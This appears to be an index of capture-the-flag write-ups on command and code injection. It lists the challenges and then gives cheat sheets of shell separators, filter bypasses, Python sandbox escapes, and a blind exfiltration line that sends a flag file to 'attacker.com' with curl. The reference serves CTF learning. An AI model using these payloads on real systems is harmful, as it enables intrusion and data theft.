# Code and Command Injection

Challenges where user-controlled input is passed to a shell, interpreter, or `eval`-style function without sufficient sanitization, giving the attacker arbitrary code execution on the server.

## Challenges

| challenge | injection surface | language / interpreter | key technique |
|---|---|---|---|
| [ping1](<ping1.md>) | Network tool (ping) CLI argument | Bash | Basic command chaining: `; cat /flag`, `&& id` |
| [ping2](<ping2.md>) | Same as ping1 with a character blacklist | Bash | Advanced filter evasion: `${IFS}`, `$'...'`, glob expansion |
| [blind-injection](<blind-injection.md>) | Same surface, no visible output | Bash | Redirect output to a web-accessible file: `; id > /var/www/html/x` |
| [qrdrop](<qrdrop.md>) | QR code content parsed as shell arg | Bash | Malicious command embedded in QR code string |
| [calcolatrice](<calcolatrice.md>) | Calculator expression via PHP `eval()` | PHP | Direct PHP code execution: `system('cat /flag.txt')` |
| [spreadsheetzero](<spreadsheetzero.md>) | Spreadsheet formula via PHP `eval()` | PHP | Same PHP eval exploitation path |
| [3val](<3val.md>) | Python expression evaluator with blacklist | Python | MRO traversal: `().__class__.__base__.__subclasses__()` → file read |
| [autograder](<autograder.md>) | Python homework grader with strict blacklist | Python | `_ModuleLock.__init__.__globals__['__built'+'ins__']['op'+'en']('/flag.txt')` |
| [gitpeek](<gitpeek.md>) | Git branch name appended to shell command | Bash | Shell variable expansion: inject `$FLAG` to exfiltrate env var |
| [timp](<timp.md>) | `cowsay` argument with space filter | Bash | `$(cat /flag.txt)` substitution; `${IFS}` for bypassing space blacklist |
| [virus-vault](<virus-vault.md>) | File upload filename parameter | Bash | Time-based blind injection in filename; char-by-char extraction via response delay |

## OS Command Injection Quick Reference

**Basic separators (try in order):**
```bash
; id
| id
&& id
|| id
`id`
$(id)
%0a id          # newline (URL-encoded)
```

**Space filter bypass:**
```bash
${IFS}          # Internal Field Separator (default = space/tab/newline)
$'\x20'         # hex-encoded space
{cat,/flag}     # brace expansion (no spaces needed)
```

**Blind exfiltration (no visible output):**
```bash
; cat /flag > /var/www/html/out.txt    # write to web root
; curl attacker.com/?x=$(cat /flag)   # out-of-band HTTP
; sleep $(grep -c a /flag)            # time-based (1 second per match)
```

## Python Sandbox Escape Reference

**MRO-based object hierarchy traversal:**
```python
# Find a useful subclass (e.g., _io.FileIO or warnings.catch_warnings)
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'FileIO'][0]('/flag.txt').read()
```

**Access builtins when `__builtins__` is blocked:**
```python
# Fragment the string to evade static keyword blacklist
().__class__.__base__.__subclasses__()[<idx>].__init__.__globals__['__built' + 'ins__']['op' + 'en']('/flag.txt').readlines()
```

**Key insight:** static blacklists that scan for `import`, `open`, `eval`, `exec`, `__builtins__` are defeated by string concatenation, variable reassignment, or accessing the same objects through the object hierarchy rather than by name.
